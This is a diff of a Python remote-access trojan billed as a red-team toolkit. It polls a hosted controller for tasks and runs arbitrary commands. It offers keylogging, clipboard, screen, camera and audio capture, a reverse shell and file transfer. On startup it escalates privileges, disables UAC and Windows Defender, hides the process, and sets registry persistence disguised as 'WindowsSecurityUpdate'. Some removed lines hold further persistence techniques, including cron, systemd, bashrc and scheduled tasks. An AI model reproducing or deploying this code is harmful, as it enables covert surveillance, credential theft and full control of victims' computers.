@@ -30,11 +30,9 @@ Additional Advanced Features:
 - Anti-VM and anti-debugging evasion
 - Advanced stealth and obfuscation
 - Cross-platform support (Windows/Linux)
-- AUTOSTART: Automatic connection without controller intervention
-- ADVANCED ERROR HANDLING: Comprehensive retry and recovery mechanisms
 
 Author: Advanced Red Team Toolkit
-Version: 3.0 (Autostart + Enhanced Error Handling)
+Version: 2.0 (UACME Enhanced)
 """
 
 import requests
@@ -48,35 +46,6 @@ import random
 import mss
 import numpy as np
 import cv2
-import logging
-import traceback
-from datetime import datetime, timedelta
-from functools import wraps
-import signal
-import atexit
-import secrets
-import hmac
-import hashlib
-
-# Advanced logging configuration
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('agent.log'),
-        logging.StreamHandler()
-    ]
-)
-logger = logging.getLogger(__name__)
-
-try:
-    from cryptography.fernet import Fernet
-    from cryptography.hazmat.primitives import hashes
-    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-    CRYPTOGRAPHY_AVAILABLE = True
-except ImportError:
-    CRYPTOGRAPHY_AVAILABLE = False
-
 try:
     import win32api
     import win32con
@@ -117,338 +86,7 @@ try:
 except ImportError:
     PYAUTOGUI_AVAILABLE = False
 
-SERVER_URL = "http://localhost:8080"  # Change to your controller's URL
-
-# --- AUTOSTART CONFIGURATION ---
-AUTOSTART_CONFIG = {
-    'enabled': True,
-    'max_connection_attempts': 50,
-    'initial_retry_delay': 2,
-    'max_retry_delay': 300,  # 5 minutes
-    'exponential_backoff_multiplier': 1.5,
-    'connection_timeout': 30,
-    'health_check_interval': 60,
-    'auto_restart_on_failure': True,
-    'stealth_delay_range': (1, 5),  # Random delay between attempts
-    'persistence_check_interval': 3600,  # 1 hour
-}
-
-# --- ADVANCED ERROR HANDLING CLASSES ---
-
-class RetryExhaustedError(Exception):
-    """Raised when all retry attempts have been exhausted"""
-    pass
-
-class ConnectionManager:
-    """Manages connection state and retry logic"""
-    
-    def __init__(self):
-        self.connected = False
-        self.last_connection_time = None
-        self.connection_attempts = 0
-        self.last_error = None
-        self.retry_delay = AUTOSTART_CONFIG['initial_retry_delay']
-        self.health_check_thread = None
-        self.running = True
-        
-    def reset_retry_delay(self):
-        """Reset retry delay to initial value"""
-        self.retry_delay = AUTOSTART_CONFIG['initial_retry_delay']
-        
-    def increase_retry_delay(self):
-        """Increase retry delay with exponential backoff"""
-        self.retry_delay = min(
-            self.retry_delay * AUTOSTART_CONFIG['exponential_backoff_multiplier'],
-            AUTOSTART_CONFIG['max_retry_delay']
-        )
-        
-    def mark_connected(self):
-        """Mark connection as successful"""
-        self.connected = True
-        self.last_connection_time = time.time()
-        self.connection_attempts = 0
-        self.reset_retry_delay()
-        logger.info("Connection established successfully")
-        
-    def mark_disconnected(self, error=None):
-        """Mark connection as failed"""
-        self.connected = False
-        self.last_error = error
-        if error:
-            logger.error(f"Connection lost: {error}")
-            
-    def should_retry(self):
-        """Check if we should attempt to retry connection"""
-        return (self.connection_attempts < AUTOSTART_CONFIG['max_connection_attempts'] and
-                self.running)
-
-def retry_on_failure(max_attempts=3, delay=1, exponential_backoff=True, 
-                    exceptions=(Exception,), logger_func=None):
-    """Decorator for automatic retry on function failure"""
-    def decorator(func):
-        @wraps(func)
-        def wrapper(*args, **kwargs):
-            attempts = 0
-            current_delay = delay
-            
-            while attempts < max_attempts:
-                try:
-                    return func(*args, **kwargs)
-                except exceptions as e:
-                    attempts += 1
-                    if logger_func:
-                        logger_func(f"Attempt {attempts}/{max_attempts} failed for {func.__name__}: {e}")
-                    
-                    if attempts >= max_attempts:
-                        if logger_func:
-                            logger_func(f"All retry attempts exhausted for {func.__name__}")
-                        raise RetryExhaustedError(f"Function {func.__name__} failed after {max_attempts} attempts")
-                    
-                    if exponential_backoff:
-                        current_delay *= 2
-                    
-                    time.sleep(current_delay)
-                    
-            return None
-        return wrapper
-    return decorator
-
-def safe_execute(func, *args, **kwargs):
-    """Safely execute a function with comprehensive error handling"""
-    try:
-        return func(*args, **kwargs)
-    except Exception as e:
-        logger.error(f"Error executing {func.__name__}: {e}")
-        logger.debug(f"Traceback: {traceback.format_exc()}")
-        return None
-
-class AgentHealthMonitor:
-    """Monitors agent health and handles automatic recovery"""
-    
-    def __init__(self, connection_manager):
-        self.connection_manager = connection_manager
-        self.monitoring = False
-        self.monitor_thread = None
-        
-    def start_monitoring(self):
-        """Start health monitoring in background thread"""
-        if self.monitoring:
-            return
-            
-        self.monitoring = True
-        self.monitor_thread = threading.Thread(target=self._health_check_loop, daemon=True)
-        self.monitor_thread.start()
-        logger.info("Health monitoring started")
-        
-    def stop_monitoring(self):
-        """Stop health monitoring"""
-        self.monitoring = False
-        if self.monitor_thread:
-            self.monitor_thread.join(timeout=5)
-        logger.info("Health monitoring stopped")
-        
-    def _health_check_loop(self):
-        """Main health monitoring loop"""
-        while self.monitoring:
-            try:
-                if self.connection_manager.connected:
-                    # Perform health check
-                    if not self._perform_health_check():
-                        logger.warning("Health check failed, marking as disconnected")
-                        self.connection_manager.mark_disconnected("Health check failed")
-                        
-                        if AUTOSTART_CONFIG['auto_restart_on_failure']:
-                            logger.info("Attempting automatic reconnection...")
-                            self._attempt_reconnection()
-                
-                time.sleep(AUTOSTART_CONFIG['health_check_interval'])
-                
-            except Exception as e:
-                logger.error(f"Health monitor error: {e}")
-                time.sleep(30)  # Wait before retrying
-                
-    def _perform_health_check(self):
-        """Perform a health check by sending a ping to the server"""
-        try:
-            response = requests.get(f"{SERVER_URL}/status", timeout=10)
-            return response.status_code == 200
-        except:
-            return False
-            
-    def _attempt_reconnection(self):
-        """Attempt to reconnect to the server"""
-        try:
-            # This will be implemented in the main connection logic
-            pass
-        except Exception as e:
-            logger.error(f"Reconnection attempt failed: {e}")
-
-# Global instances
-connection_manager = ConnectionManager()
-health_monitor = AgentHealthMonitor(connection_manager)
-
-# --- AUTOSTART FUNCTIONS ---
-
-@retry_on_failure(max_attempts=3, delay=2, logger_func=logger.warning)
-def test_server_connectivity():
-    """Test if the server is reachable"""
-    try:
-        response = requests.get(f"{SERVER_URL}/status", timeout=AUTOSTART_CONFIG['connection_timeout'])
-        return response.status_code == 200
-    except requests.exceptions.RequestException as e:
-        logger.debug(f"Server connectivity test failed: {e}")
-        raise
-
-def wait_for_server_availability():
-    """Wait for server to become available with exponential backoff"""
-    logger.info("Waiting for server availability...")
-    
-    while connection_manager.should_retry():
-        try:
-            if test_server_connectivity():
-                logger.info("Server is available")
-                return True
-                
-        except Exception as e:
-            connection_manager.connection_attempts += 1
-            logger.warning(f"Server not available (attempt {connection_manager.connection_attempts}): {e}")
-            
-            if connection_manager.should_retry():
-                # Random delay for stealth
-                stealth_delay = random.uniform(*AUTOSTART_CONFIG['stealth_delay_range'])
-                total_delay = connection_manager.retry_delay + stealth_delay
-                
-                logger.info(f"Waiting {total_delay:.1f} seconds before retry...")
-                time.sleep(total_delay)
-                connection_manager.increase_retry_delay()
-            else:
-                logger.error("Maximum connection attempts reached")
-                break
-                
-    return False
-
-def auto_establish_connection():
-    """Automatically establish connection to the server"""
-    logger.info("Auto-establishing connection...")
-    
-    try:
-        # Wait for server availability
-        if not wait_for_server_availability():
-            logger.error("Failed to establish connection - server not available")
-            return False
-            
-        # Attempt to register with the server
-        agent_id = get_or_create_agent_id()
-        
-        registration_data = {
-            'id': agent_id,
-            'hostname': get_system_info().get('hostname', 'unknown'),
-            'platform': get_system_info().get('platform', 'unknown'),
-            'auto_started': True,
-            'capabilities': get_agent_capabilities()
-        }
-        
-        response = requests.post(
-            f"{SERVER_URL}/register", 
-            json=registration_data,
-            timeout=AUTOSTART_CONFIG['connection_timeout']
-        )
-        
-        if response.status_code == 200:
-            connection_manager.mark_connected()
-            logger.info(f"Successfully registered with server (Agent ID: {agent_id})")
-            
-            # Start health monitoring
-            health_monitor.start_monitoring()
-            
-            return True
-        else:
-            logger.error(f"Registration failed with status code: {response.status_code}")
-            return False
-            
-    except Exception as e:
-        logger.error(f"Auto-connection failed: {e}")
-        connection_manager.mark_disconnected(str(e))
-        return False
-
-def get_system_info():
-    """Get basic system information for registration"""
-    try:
-        info = {
-            "hostname": socket.gethostname(),
-            "platform": platform.system(),
-            "architecture": platform.architecture()[0] if platform.architecture() else "unknown",
-            "platform_detailed": platform.platform(),
-            "python_version": platform.python_version(),
-            "user": os.getenv('USERNAME', os.getenv('USER', 'unknown')),
-            "cpu_count": os.cpu_count(),
-        }
-        
-        # Add Windows-specific info
-        if WINDOWS_AVAILABLE:
-            info["is_admin"] = is_admin()
-            
-        return info
-    except Exception as e:
-        logger.error(f"Error getting system info: {e}")
-        return {
-            "hostname": "unknown",
-            "platform": "unknown",
-            "error": str(e)
-        }
-
-def get_agent_capabilities():
-    """Get list of agent capabilities for registration"""
-    capabilities = []
-    
-    if WINDOWS_AVAILABLE:
-        capabilities.extend(['windows_support', 'uac_bypass', 'privilege_escalation'])
-        if is_admin():
-            capabilities.append('admin_privileges')
-    
-    if SPEECH_RECOGNITION_AVAILABLE:
-        capabilities.append('speech_recognition')
-        
-    if PYAUTOGUI_AVAILABLE:
-        capabilities.append('gui_automation')
-        
-    capabilities.extend([
-        'screen_capture', 'keylogging', 'clipboard_monitoring',
-        'file_operations', 'process_management', 'reverse_shell',
-        'auto_start', 'health_monitoring'
-    ])
-    
-    return capabilities
-
-def setup_signal_handlers():
-    """Setup signal handlers for graceful shutdown"""
-    def signal_handler(signum, frame):
-        logger.info(f"Received signal {signum}, shutting down gracefully...")
-        connection_manager.running = False
-        health_monitor.stop_monitoring()
-        cleanup_agent()
-        sys.exit(0)
-    
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-
-def cleanup_agent():
-    """Cleanup function called on exit"""
-    logger.info("Cleaning up agent...")
-    try:
-        stop_streaming()
-        stop_audio_streaming()
-        stop_camera_streaming()
-        stop_keylogger()
-        stop_clipboard_monitor()
-        stop_reverse_shell()
-        stop_voice_control()
-        health_monitor.stop_monitoring()
-    except Exception as e:
-        logger.error(f"Cleanup error: {e}")
-
-# Register cleanup function
-atexit.register(cleanup_agent)
+SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
 
 # --- Privilege Escalation Functions ---
 
@@ -2062,218 +1700,32 @@ def run_as_admin():
     return True
 
 def setup_persistence():
-    """Setup enhanced persistence mechanisms with autostart support."""
-    success_count = 0
-    
-    if WINDOWS_AVAILABLE:
-        success_count += setup_windows_persistence()
-    else:
-        success_count += setup_linux_persistence()
-    
-    # Create autostart script
-    if create_autostart_script():
-        success_count += 1
-    
-    return success_count > 0
-
-def setup_windows_persistence():
-    """Setup Windows-specific persistence mechanisms."""
-    success_count = 0
+    """Setup persistence mechanisms."""
+    if not WINDOWS_AVAILABLE:
+        return False
     
     try:
         import winreg
         
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
-            python_path = sys.executable
-            current_exe = f'"{python_path}" "{current_exe}"'
+            current_exe = f'python.exe "{current_exe}"'
         
-        # Method 1: Registry Run key (Current User)
-        try:
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run",
-                0,
-                winreg.KEY_SET_VALUE
-            )
-            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
-            winreg.CloseKey(key)
-            logger.info("✓ Registry persistence (HKCU) established")
-            success_count += 1
-        except Exception as e:
-            logger.warning(f"Registry persistence (HKCU) failed: {e}")
+        # Add to startup registry
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
         
-        # Method 2: Registry Run key (Local Machine) - requires admin
-        if is_admin():
-            try:
-                key = winreg.OpenKey(
-                    winreg.HKEY_LOCAL_MACHINE,
-                    r"Software\Microsoft\Windows\CurrentVersion\Run",
-                    0,
-                    winreg.KEY_SET_VALUE
-                )
-                winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
-                winreg.CloseKey(key)
-                logger.info("✓ Registry persistence (HKLM) established")
-                success_count += 1
-            except Exception as e:
-                logger.warning(f"Registry persistence (HKLM) failed: {e}")
+        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
+        winreg.CloseKey(key)
         
-        # Method 3: Startup folder
-        try:
-            import os
-            startup_path = os.path.join(
-                os.getenv('APPDATA'), 
-                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
-            )
-            
-            if os.path.exists(startup_path):
-                batch_file = os.path.join(startup_path, 'WindowsSecurityUpdate.bat')
-                with open(batch_file, 'w') as f:
-                    f.write(f'@echo off\n{current_exe}\n')
-                logger.info("✓ Startup folder persistence established")
-                success_count += 1
-        except Exception as e:
-            logger.warning(f"Startup folder persistence failed: {e}")
-        
-        # Method 4: Scheduled Task (requires admin)
-        if is_admin():
-            try:
-                task_command = f'schtasks /create /tn "WindowsSecurityUpdate" /tr "{current_exe}" /sc onlogon /f'
-                result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
-                if result.returncode == 0:
-                    logger.info("✓ Scheduled task persistence established")
-                    success_count += 1
-                else:
-                    logger.warning(f"Scheduled task failed: {result.stderr}")
-            except Exception as e:
-                logger.warning(f"Scheduled task persistence failed: {e}")
-        
-    except Exception as e:
-        logger.error(f"Windows persistence setup failed: {e}")
-    
-    return success_count
-
-def setup_linux_persistence():
-    """Setup Linux-specific persistence mechanisms."""
-    success_count = 0
-    
-    try:
-        current_exe = os.path.abspath(__file__)
-        python_path = sys.executable
-        command = f'"{python_path}" "{current_exe}"'
-        
-        # Method 1: Systemd user service (most common)
-        try:
-            user_systemd_dir = os.path.expanduser('~/.config/systemd/user')
-            os.makedirs(user_systemd_dir, exist_ok=True)
-            
-            service_content = f"""[Unit]
-Description=Security Update Service
-After=network.target
-
-[Service]
-Type=simple
-ExecStart={command}
-Restart=always
-RestartSec=10
-Environment=DISPLAY=:0
-
-[Install]
-WantedBy=default.target
-"""
-            service_file = os.path.join(user_systemd_dir, 'security-update.service')
-            with open(service_file, 'w') as f:
-                f.write(service_content)
-            
-            # Enable the service
-            subprocess.run(['systemctl', '--user', 'enable', 'security-update.service'], 
-                         capture_output=True)
-            logger.info("✓ Systemd user service persistence established")
-            success_count += 1
-        except Exception as e:
-            logger.warning(f"Systemd persistence failed: {e}")
-        
-        # Method 2: Crontab
-        try:
-            cron_entry = f"@reboot {command}"
-            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
-            current_crontab = result.stdout if result.returncode == 0 else ""
-            
-            if cron_entry not in current_crontab:
-                new_crontab = current_crontab + f"\n{cron_entry}\n"
-                subprocess.run(['crontab', '-'], input=new_crontab, text=True)
-                logger.info("✓ Crontab persistence established")
-                success_count += 1
-        except Exception as e:
-            logger.warning(f"Crontab persistence failed: {e}")
-        
-        # Method 3: .bashrc/.profile
-        try:
-            bashrc_path = os.path.expanduser('~/.bashrc')
-            if os.path.exists(bashrc_path):
-                with open(bashrc_path, 'r') as f:
-                    content = f.read()
-                
-                bashrc_entry = f"nohup {command} > /dev/null 2>&1 &"
-                if bashrc_entry not in content:
-                    with open(bashrc_path, 'a') as f:
-                        f.write(f"\n# Security update\n{bashrc_entry}\n")
-                    logger.info("✓ .bashrc persistence established")
-                    success_count += 1
-        except Exception as e:
-            logger.warning(f".bashrc persistence failed: {e}")
-        
-    except Exception as e:
-        logger.error(f"Linux persistence setup failed: {e}")
-    
-    return success_count
-
-def create_autostart_script():
-    """Create a standalone autostart script for additional persistence."""
-    try:
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        
-        if WINDOWS_AVAILABLE:
-            script_path = os.path.join(script_dir, 'autostart.bat')
-            content = f"""@echo off
-echo Starting enhanced agent with autostart...
-cd /d "{script_dir}"
-"{sys.executable}" "{os.path.abspath(__file__)}"
-if errorlevel 1 (
-    echo Agent crashed, waiting 30 seconds before restart...
-    timeout /t 30 /nobreak > nul
-    goto :start
-)
-"""
-        else:
-            script_path = os.path.join(script_dir, 'autostart.sh')
-            content = f"""#!/bin/bash
-echo "Starting enhanced agent with autostart..."
-cd "{script_dir}"
-while true; do
-    "{sys.executable}" "{os.path.abspath(__file__)}"
-    if [ $? -ne 0 ]; then
-        echo "Agent crashed, waiting 30 seconds before restart..."
-        sleep 30
-    else
-        break
-    fi
-done
-"""
-        
-        with open(script_path, 'w') as f:
-            f.write(content)
-        
-        # Make executable on Linux
-        if not WINDOWS_AVAILABLE:
-            os.chmod(script_path, 0o755)
-        
-        logger.info(f"✓ Autostart script created: {script_path}")
         return True
         
     except Exception as e:
-        logger.error(f"Failed to create autostart script: {e}")
+        print(f"Failed to setup persistence: {e}")
         return False
 
 def anti_analysis():
@@ -3482,95 +2934,54 @@ def execute_command(command):
     except Exception as e:
         return f"Command execution failed: {e}"
 
-@retry_on_failure(max_attempts=3, delay=1, logger_func=logger.warning)
-def enhanced_main_loop(agent_id):
-    """Enhanced main command and control loop with error handling and autostart support."""
-    logger.info(f"Starting enhanced main loop for agent {agent_id}")
-    
+def main_loop(agent_id):
+    """The main command and control loop."""
     # Initialize high-performance systems
-    logger.info("Initializing high-performance systems...")
-    low_latency_available = safe_execute(initialize_low_latency_input)
-    logger.info(f"Low-latency input: {'Available' if low_latency_available else 'Fallback mode'}")
-    
-    # Auto-start reverse shell if configured
-    if AUTOSTART_CONFIG['enabled']:
-        logger.info("Auto-starting reverse shell...")
-        safe_execute(start_reverse_shell, agent_id)
+    print("Initializing high-performance systems...")
+    low_latency_available = initialize_low_latency_input()
+    print(f"Low-latency input: {'Available' if low_latency_available else 'Fallback mode'}")
     
     internal_commands = {
-        "start-stream": lambda: safe_execute(start_streaming, agent_id),
-        "stop-stream": lambda: safe_execute(stop_streaming),
-        "start-audio": lambda: safe_execute(start_audio_streaming, agent_id),
-        "stop-audio": lambda: safe_execute(stop_audio_streaming),
-        "start-camera": lambda: safe_execute(start_camera_streaming, agent_id),
-        "stop-camera": lambda: safe_execute(stop_camera_streaming),
-        "start-keylogger": lambda: safe_execute(start_keylogger, agent_id),
-        "stop-keylogger": lambda: safe_execute(stop_keylogger),
-        "start-clipboard": lambda: safe_execute(start_clipboard_monitor, agent_id),
-        "stop-clipboard": lambda: safe_execute(stop_clipboard_monitor),
-        "start-reverse-shell": lambda: safe_execute(start_reverse_shell, agent_id),
-        "stop-reverse-shell": lambda: safe_execute(stop_reverse_shell),
-        "start-voice-control": lambda: safe_execute(start_voice_control, agent_id),
-        "stop-voice-control": lambda: safe_execute(stop_voice_control),
-        "kill-taskmgr": lambda: safe_execute(kill_task_manager),
-        "health-check": lambda: {"status": "healthy", "connected": connection_manager.connected},
-        "get-capabilities": lambda: get_agent_capabilities(),
-        "reconnect": lambda: auto_establish_connection(),
+        "start-stream": lambda: start_streaming(agent_id),
+        "stop-stream": stop_streaming,
+        "start-audio": lambda: start_audio_streaming(agent_id),
+        "stop-audio": stop_audio_streaming,
+        "start-camera": lambda: start_camera_streaming(agent_id),
+        "stop-camera": stop_camera_streaming,
+        "start-keylogger": lambda: start_keylogger(agent_id),
+        "stop-keylogger": stop_keylogger,
+        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
+        "stop-clipboard": stop_clipboard_monitor,
+        "start-reverse-shell": lambda: start_reverse_shell(agent_id),
+        "stop-reverse-shell": stop_reverse_shell,
+        "start-voice-control": lambda: start_voice_control(agent_id),
+        "stop-voice-control": stop_voice_control,
+        "kill-taskmgr": kill_task_manager,
     }
     
     # Performance monitoring counter
     performance_check_counter = 0
-    consecutive_failures = 0
-    max_consecutive_failures = 5
 
-    while connection_manager.running:
+    while True:
         try:
-            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=15)
-            
-            if response.status_code != 200:
-                logger.warning(f"Server returned status code: {response.status_code}")
-                consecutive_failures += 1
-                if consecutive_failures >= max_consecutive_failures:
-                    logger.error("Too many consecutive failures, marking as disconnected")
-                    connection_manager.mark_disconnected("Multiple server errors")
-                    if AUTOSTART_CONFIG['auto_restart_on_failure']:
-                        auto_establish_connection()
-                continue
-            
-            # Reset failure counter on success
-            consecutive_failures = 0
-            connection_manager.mark_connected()
-            
+            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
             task = response.json()
             command = task.get("command", "sleep")
-            
-            logger.debug(f"Received command: {command}")
 
             if command in internal_commands:
-                result = internal_commands[command]()
-                if result:
-                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                               json={"output": str(result)}, timeout=10)
+                internal_commands[command]()
             elif command.startswith("upload-file:"):
-                output = safe_execute(handle_file_upload, command.split(":", 2))
-                if output:
-                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                               json={"output": output}, timeout=10)
+                output = handle_file_upload(command.split(":", 2))
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("download-file:"):
-                output = safe_execute(handle_file_download, command.split(":", 1), agent_id)
-                if output:
-                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                               json={"output": output}, timeout=10)
+                output = handle_file_download(command.split(":", 1), agent_id)
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("play-voice:"):
-                output = safe_execute(handle_voice_playback, command.split(":", 1))
-                if output:
-                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                               json={"output": output}, timeout=10)
+                output = handle_voice_playback(command.split(":", 1))
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("live-audio:"):
-                output = safe_execute(handle_live_audio, command.split(":", 1))
-                if output:
-                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                               json={"output": output}, timeout=10)
+                output = handle_live_audio(command.split(":", 1))
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("terminate-process:"):
                 # Handle process termination with admin privileges
                 parts = command.split(":", 1)
@@ -3581,55 +2992,37 @@ def enhanced_main_loop(agent_id):
                         process_target = int(process_target)
                     except ValueError:
                         pass  # Keep as string (process name)
-                    output = safe_execute(terminate_process_with_admin, process_target, force=True)
+                    output = terminate_process_with_admin(process_target, force=True)
                 else:
                     output = "Invalid terminate-process command format"
-                if output:
-                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                               json={"output": output}, timeout=10)
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("{") and "remote_control" in command:
                 # Handle remote control commands (JSON format)
                 try:
                     import json
                     command_data = json.loads(command)
                     if command_data.get("type") == "remote_control":
-                        safe_execute(handle_remote_control, command_data)
+                        handle_remote_control(command_data)
                         # Send success response
-                        safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                                   json={"output": "Remote control command executed"}, timeout=10)
+                        requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": "Remote control command executed"})
                 except Exception as e:
-                    logger.error(f"Remote control error: {e}")
-                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                               json={"output": f"Remote control error: {e}"}, timeout=10)
+                    requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": f"Remote control error: {e}"})
             elif command != "sleep":
-                output = safe_execute(execute_command, command)
-                if output:
-                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
-                               json={"output": output}, timeout=10)
+                output = execute_command(command)
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
         
-        except requests.exceptions.RequestException as e:
-            consecutive_failures += 1
-            logger.warning(f"Network error (attempt {consecutive_failures}): {e}")
-            connection_manager.mark_disconnected(str(e))
-            
-            if consecutive_failures >= max_consecutive_failures:
-                logger.error("Network connection lost, attempting reconnection...")
-                if AUTOSTART_CONFIG['auto_restart_on_failure']:
-                    auto_establish_connection()
-                consecutive_failures = 0
-        except Exception as e:
-            logger.error(f"Unexpected error in main loop: {e}")
-            logger.debug(f"Traceback: {traceback.format_exc()}")
-            consecutive_failures += 1
+        except requests.exceptions.RequestException:
+            # This is expected when the server is down, just wait and retry
+            pass
         
         # Performance monitoring (every 30 seconds)
         performance_check_counter += 1
         if performance_check_counter >= 30 and low_latency_available:
-            stats = safe_execute(get_input_performance_stats)
-            if stats and stats.get('input_count', 0) > 0:
-                logger.info(f"Input performance - Avg latency: {stats.get('avg_latency', 0):.1f}ms, "
-                          f"Queue: {stats.get('queue_size', 0)}, "
-                          f"Processed: {stats.get('input_count', 0)}")
+            stats = get_input_performance_stats()
+            if stats.get('input_count', 0) > 0:
+                print(f"Input performance - Avg latency: {stats.get('avg_latency', 0):.1f}ms, "
+                      f"Queue: {stats.get('queue_size', 0)}, "
+                      f"Processed: {stats.get('input_count', 0)}")
             performance_check_counter = 0
         
         # Adaptive sleep to reduce traffic when idle
@@ -3638,11 +3031,6 @@ def enhanced_main_loop(agent_id):
                           CLIPBOARD_MONITOR_ENABLED or REVERSE_SHELL_ENABLED or
                           VOICE_CONTROL_ENABLED) else 5
         time.sleep(sleep_time)
-
-# Legacy function for backward compatibility
-def main_loop(agent_id):
-    """Legacy main loop function - calls enhanced version"""
-    return enhanced_main_loop(agent_id)
 
 # --- Process Termination Functions ---
 
@@ -3922,97 +3310,77 @@ def kill_task_manager():
         return f"Task Manager termination failed: {e}"
 
 if __name__ == "__main__":
-    # Setup signal handlers for graceful shutdown
-    setup_signal_handlers()
-    
-    logger.info("=== ENHANCED AGENT STARTING (v3.0 - Autostart + Error Handling) ===")
-    
     # Run UAC checks and elevation FIRST
     if WINDOWS_AVAILABLE:
         # Try to run as admin first
         if not is_admin():
-            logger.info("Attempting to run as administrator...")
-            if safe_execute(run_as_admin):
+            print("Attempting to run as administrator...")
+            if run_as_admin():
                 # Script will restart with admin privileges
                 sys.exit()
         
         # If we're admin, disable UAC
         if is_admin():
-            logger.info("Running with administrator privileges")
-            if safe_execute(disable_uac):
-                logger.info("UAC disabled successfully")
+            print("Running with administrator privileges")
+            if disable_uac():
+                print("UAC disabled successfully")
             else:
-                logger.warning("Could not disable UAC")
+                print("Could not disable UAC")
     
     # Run anti-analysis checks
     try:
-        safe_execute(anti_analysis)
+        anti_analysis()
     except:
         pass
     
     # Initialize stealth and privilege escalation
-    logger.info("Initializing agent...")
+    print("Initializing agent...")
     
     # Random sleep to avoid pattern detection
-    safe_execute(sleep_random)
+    sleep_random()
     
     # Check current privileges
-    if WINDOWS_AVAILABLE and is_admin():
-        logger.info("Agent running with admin privileges")
+    if is_admin():
+        print("Agent running with admin privileges")
         # Disable Windows Defender if possible
-        if safe_execute(disable_defender):
-            logger.info("Windows Defender disabled")
+        if disable_defender():
+            print("Windows Defender disabled")
         else:
-            logger.warning("Could not disable Windows Defender")
+            print("Could not disable Windows Defender")
     else:
-        logger.info("Agent running with user privileges, attempting elevation...")
-        if safe_execute(elevate_privileges):
-            logger.info("Privilege escalation successful")
+        print("Agent running with user privileges, attempting elevation...")
+        if elevate_privileges():
+            print("Privilege escalation successful")
         else:
-            logger.warning("Privilege escalation failed, continuing with user privileges")
+            print("Privilege escalation failed, continuing with user privileges")
     
     # Setup stealth features
     try:
-        safe_execute(hide_process)
-        safe_execute(add_firewall_exception)
-        safe_execute(setup_persistence)
+        hide_process()
+        add_firewall_exception()
+        setup_persistence()
         
         # Establish advanced persistence using UACME-inspired techniques
-        if safe_execute(establish_persistence):
-            logger.info("Advanced persistence mechanisms established")
+        if establish_persistence():
+            print("Advanced persistence mechanisms established")
         
-        logger.info("Stealth features initialized")
+        print("Stealth features initialized")
     except Exception as e:
-        logger.warning(f"Stealth initialization warning: {e}")
+        print(f"Stealth initialization warning: {e}")
     
-    # Initialize connection manager and auto-establish connection
     agent_id = get_or_create_agent_id()
-    logger.info(f"Agent starting with ID: {agent_id}")
-    
+    print(f"Agent starting with ID: {agent_id}")
     try:
-        if AUTOSTART_CONFIG['enabled']:
-            logger.info("Autostart enabled - attempting automatic connection...")
-            if auto_establish_connection():
-                logger.info("✓ Automatic connection established successfully")
-            else:
-                logger.warning("⚠ Automatic connection failed, will retry during main loop")
-        
-        # Start the enhanced main loop
-        enhanced_main_loop(agent_id)
-        
+        main_loop(agent_id)
     except KeyboardInterrupt:
-        logger.info("\nReceived interrupt signal, shutting down gracefully...")
-        cleanup_agent()
-    except Exception as e:
-        logger.error(f"Fatal error in main execution: {e}")
-        logger.debug(f"Traceback: {traceback.format_exc()}")
-        cleanup_agent()
-        
-        # Attempt restart if configured
-        if AUTOSTART_CONFIG['auto_restart_on_failure']:
-            logger.info("Attempting automatic restart...")
-            time.sleep(30)  # Wait before restart
-            os.execv(sys.executable, [sys.executable] + sys.argv)
+        print("\nAgent shutting down.")
+        stop_streaming()
+        stop_audio_streaming()
+        stop_camera_streaming()
+        stop_keylogger()
+        stop_clipboard_monitor()
+        stop_reverse_shell()
+        stop_voice_control()
 
 # ========================================================================================
 # HIGH PERFORMANCE CAPTURE MODULE
@@ -5206,578 +4574,6 @@ def test_process_termination_functionality():
             break
         except Exception as e:
             print(f"Error: {e}")
-
-# ========================================================================================
-# From enhanced_agent.py - Enhanced Python Agent with Comprehensive Improvements
-# ========================================================================================
-
-import sys
-import os
-import time
-import threading
-import logging
-from typing import Optional, Dict, Any, List
-
-# Set up logging for enhanced features
-enhanced_logger = logging.getLogger('enhanced_agent')
-
-class EnhancedAgent:
-    """Enhanced agent with all improvements integrated"""
-    
-    def __init__(self, server_url: str = "http://localhost:8080"):
-        self.server_url = server_url
